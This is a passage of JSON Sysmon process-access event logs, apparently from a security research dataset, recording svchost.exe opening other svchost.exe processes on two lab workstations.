C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+108a0|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-07-22 04:19:00.008","TargetImage":"C:\\windows\\System32\\svchost.exe","@timestamp":"2020-07-22T04:19:01.096Z","TargetProcessGUID":"{b59756a9-996d-5f14-4700-000000000400}","Hostname":"WORKSTATION5.mordor.local","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+108a0|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:19:00","Severity":"INFO","EventID":10,"SourceImage":"C:\\windows\\system32\\svchost.exe","ThreadID":6244,"RecordNumber":1782130}
{"Task":10,"EventReceivedTime":"2020-07-22 00:19:01","SourceProcessGUID":"{03255e25-9966-5f14-1200-000000000400}","SourceThreadId":"5184","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceProcessId":"444","TargetProcessId":"3232","Version":3,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"444","UserID":"S-1-5-18","GrantedAccess":"0x1000","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:19:00.001\r\nSourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}\r\nSourceProcessId: 444\r\nSourceThreadId: 5184\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}\r\nTargetProcessId: 3232\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+106fe|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-07-22 04:19:00.001","TargetImage":"C:\\windows\\System32\\svchost.exe","@timestamp":"2020-07-22T04:19:01.097Z","TargetProcessGUID":"{03255e25-996e-5f14-4700-000000000400}","Hostname":"WORKSTATION6.mordor.local","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+106fe|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":7856,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:19:00","Severity":"INFO","EventID":10,"SourceImage":"C:\\windows\\system32\\svchost.exe","ThreadID":6664,"RecordNumber":706024}
{"Task":10,"EventReceivedTime":"2020-07-22 00:19:01","SourceProcessGUID":"{b59756a9-9966-5f14-1200-000000000400}","SourceThreadId":"8808","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceProcessId":"396","TargetProcessId":"3284","Version":3,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"396","UserID":"S-1-5-18","GrantedAccess":"0x1000","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:19:00.008\r\nSourceProcessGUID: {b59756a9-9966-5f14-1200-000000000400}\r\nSourceProcessId: 396\r\nSourceThreadId: 8808\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {b59756a9-996d-5f14-4700-000000000400}\r\nTargetProcessId: 3284\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+106fe|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-07-22 04:19:00.008","TargetImage":"C:\\windows\\System32\\svchost.exe","@timestamp":"2020-07-22T04:19:01.097Z","TargetProcessGUID":"{b59756a9-996d-5f14-4700-000000000400}","Hostname":"WORKSTATION5.mordor.local","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+106fe|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:19:00","Severity":"INFO","EventID":10,"SourceImage":"C:\\windows\\system32\\svchost.exe","ThreadID":6244,"RecordNumber":1782131}
